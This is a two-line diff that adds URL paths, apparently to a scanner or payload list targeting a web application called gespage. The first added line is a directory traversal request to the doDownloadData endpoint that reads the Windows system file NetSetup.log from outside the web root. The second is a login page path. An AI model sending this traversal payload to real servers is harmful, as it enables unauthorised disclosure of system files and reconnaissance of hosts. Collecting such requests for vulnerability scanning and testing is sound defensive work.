@@ -1,0 +1,2 @@
+/gespage/doDownloadData?file_name=../../../../../Windows/debug/NetSetup.log
+/gespage/webapp/login.xhtml
